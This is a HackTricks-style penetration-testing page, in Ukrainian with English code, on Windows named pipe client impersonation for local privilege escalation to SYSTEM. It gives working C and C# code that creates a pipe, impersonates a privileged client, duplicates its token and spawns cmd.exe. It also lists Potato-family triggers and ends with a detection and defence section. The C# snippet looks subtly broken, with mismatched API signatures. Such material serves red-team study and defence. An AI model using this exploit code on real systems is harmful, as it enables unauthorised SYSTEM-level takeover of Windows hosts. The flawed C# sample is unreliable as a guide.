# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation — це примітив локального підвищення привілеїв, який дозволяє потоку сервера іменованого каналу прийняти контекст безпеки клієнта, що підключається до нього. Насправді, атакуючий, який може виконувати код з SeImpersonatePrivilege, може примусити привілейований клієнт (наприклад, сервіс SYSTEM) підключитися до керованого атакуючим pipe, викликати ImpersonateNamedPipeClient, дублювати отриманий токен у primary token і запустити процес від імені клієнта (часто NT AUTHORITY\SYSTEM).

Ця сторінка зосереджена на основній техніці. Для повних експлойт-чейнів, які змушують SYSTEM підключатися до вашого pipe, див. сторінки сімейства Potato, зазначені нижче.

## Коротко
- Створити named pipe: \\.\pipe\<random> і чекати на підключення.
- Змусити привілейований компонент підключитися до нього (spooler/DCOM/EFSRPC/etc.).
- Прочитати принаймні одне повідомлення з pipe, потім викликати ImpersonateNamedPipeClient.
- Відкрити impersonation token поточного потоку, DuplicateTokenEx(TokenPrimary) та CreateProcessWithTokenW/CreateProcessAsUser щоб отримати процес SYSTEM.

## Вимоги та ключові API
- Привілеї, які зазвичай потрібні викликаючому процесу/потоку:
- SeImpersonatePrivilege щоб успішно імпостерувати підключеного клієнта і використовувати CreateProcessWithTokenW.
- Альтернативно, після імпостерування SYSTEM, можна використовувати CreateProcessAsUser, що може вимагати SeAssignPrimaryTokenPrivilege і SeIncreaseQuotaPrivilege (ці привілеї задовольняються, коли ви імпостеруєте SYSTEM).
- Основні API, що використовуються:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (потрібно прочитати принаймні одне повідомлення перед імпостеруванням)
- ImpersonateNamedPipeClient та RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW або CreateProcessAsUser
- Рівень імпостерування: щоб виконувати корисні локальні дії, клієнт має дозволяти SecurityImpersonation (типово для багатьох локальних RPC/named-pipe клієнтів). Клієнти можуть знизити це, передавши SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION при відкритті pipe.

## Мінімальний Win32 робочий процес (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Примітки:
- Якщо ImpersonateNamedPipeClient повертає ERROR_CANNOT_IMPERSONATE (1368), переконайтеся, що ви спочатку читаєте з pipe і що клієнт не обмежив impersonation до Identification level.
- Віддавайте перевагу DuplicateTokenEx з SecurityImpersonation і TokenPrimary для створення primary token, придатного для створення процесу.

## .NET швидкий приклад
У .NET NamedPipeServerStream може impersonate через RunAsClient. Після impersonation продублюйте thread token і створіть процес.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Поширені тригери/примуси, щоб доставити SYSTEM на ваш pipe
Ці техніки примушують привілейовані служби підключитися до вашої named pipe, щоб ви могли impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Детальне використання та сумісність див. тут:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Якщо вам потрібен повний приклад створення pipe і impersonating, щоб spawn SYSTEM з service trigger, див.:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Налагодження та підводні камені
- Ви повинні прочитати принаймні одне повідомлення з pipe перед викликом ImpersonateNamedPipeClient; інакше отримаєте ERROR_CANNOT_IMPERSONATE (1368).
- Якщо клієнт підключається з SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, сервер не зможе повністю impersonate; перевірте рівень impersonation токена через GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW вимагає SeImpersonatePrivilege у викликача. Якщо це завершується ERROR_PRIVILEGE_NOT_HELD (1314), використайте CreateProcessAsUser після того, як ви вже impersonated SYSTEM.
- Переконайтесь, що security descriptor вашого pipe дозволяє цільовій службі підключитися, якщо ви його підсилюєте; за замовчуванням, pipe під \\.\pipe доступні відповідно до DACL сервера.

## Виявлення та захист
- Моніторте створення named pipe і підключення. Sysmon Event IDs 17 (Pipe Created) та 18 (Pipe Connected) корисні для складання бази легітимних імен pipe і виявлення незвичних, випадковоподібних pipe перед подіями маніпуляцій з токеном.
- Шукайте послідовності: процес створює pipe, служба SYSTEM підключається, після чого процес-створювач породжує дочірній процес як SYSTEM.
- Зменшіть ризик, видаливши SeImpersonatePrivilege з неважливих облікових записів служб і уникаючи непотрібних логонів служб з високими привілеями.
- Захисна розробка: при підключенні до ненадійних named pipe вказуйте SECURITY_SQOS_PRESENT з SECURITY_IDENTIFICATION, щоб запобігти повному impersonate серверів клієнта, якщо це не потрібно.

## Посилання
- Windows: ImpersonateNamedPipeClient documentation (вимоги до impersonation та поведінка). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (покрокове керівництво та приклади коду). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
